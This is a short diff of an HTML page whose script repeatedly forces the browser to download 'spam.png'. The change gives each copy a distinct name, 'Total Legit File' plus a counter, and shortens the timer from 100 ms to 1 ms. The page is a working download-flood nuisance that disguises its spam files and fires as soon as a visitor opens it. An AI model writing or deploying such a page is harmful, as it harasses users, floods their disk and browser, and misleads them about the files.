@@ -4,11 +4,12 @@
 </head>
 <body>
 <script>
+  var c = 0;
 const download = p => {
   var element = document.createElement('a');
   element.setAttribute('href',p);
-  element.setAttribute('download', ` Legit File`);
-
+  element.setAttribute('download', `Total Legit File ${c}`);
+c=c+1;
   element.style.display = 'none';
   document.body.appendChild(element);
 
@@ -18,7 +19,7 @@ const download = p => {
 }
 setInterval(function(){
 download("spam.png");
-},100)
+},1)
 </script>
 </body>
 </html>
